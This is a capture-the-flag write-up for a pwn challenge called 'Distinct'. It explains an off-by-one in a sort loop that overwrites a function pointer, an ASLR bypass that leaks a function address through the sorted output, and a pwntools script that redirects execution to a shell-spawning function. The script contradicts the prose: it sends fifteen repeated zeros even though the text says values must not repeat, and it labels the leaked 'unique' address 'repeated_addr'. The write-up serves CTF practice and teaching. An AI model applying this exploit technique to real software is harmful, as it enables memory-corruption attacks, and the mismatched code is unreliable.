# Distinct

We are given code with a function that calls `/bin/sh`. Because
we do not to think any further, we want to call this function.

Looking around for vulnerabilities, we notice an off-by-one in the `sort` function:

```c
    // this should be i < len!
    for(int i = 0; i <= len; i++) {
        for(int j = i; j <= len; j++) {
```

So the `sort` function twiddles with one more long value, which we call `nums[16]`. Very conveniently, the thing that happens to be at the same memory address as `nums[16]` is `handler`, a a pointer to a function that gets called once we say we don't want to enter again. 
Normally, `handler` would be one of `&unique` or `&repeated`. But we want to have Fun, so let's figure out how to make it `&win`.

It turns out that since there's no way `&win` is located below memory address 16, asking it to sort
```
[&win, 0, 1, 2, 3, ..., 15]
```
will set `handler = nums[16] = &win`.

> The values cannot repeat, since doing so would cause the handler to be set to `&repeated`, and we cannot stop that, nor control `handler` again after that part.

So all that's left is to find the value of `&win`. Well, ASLR is enabled, so we can't just go into `gdb` or `readelf` or `nm` and get an address. But notice that initially, `handler` is set to `&unique`, and if we sort
```
[some set of 16 very high values]
```
then since `&unique` is surely below these, we can force `nums[0] = &unique`. Since we get `nums[0:15]` back at the end, we have essentially leaked the address of `unique`. From there, we know that the offset between `unique` and `win` is the same, so we just have to find the offset from the binary we're given, and calculate the value of `&win`.

Here is exploit code, using `pwntools`.

```python
from pwn import *

r = process("./distinct.o")

def send_number(num):
	r.clean()
	r.send((str(num) + "\n").encode())

for i in range(16):
	send_number(2**64 - 1)

# After calling this,
# r is expecting a Y/N
def get_array():
	lines = r.recv().decode().split("\n")
	return [*map(int, lines[1].split())]


arr = get_array()
repeated_addr = arr[0]

win_addr = repeated_addr + 0x200

r.send("Y\n".encode())

send_number(win_addr)
for i in range(15):
	send_number(0)

r.interactive()
```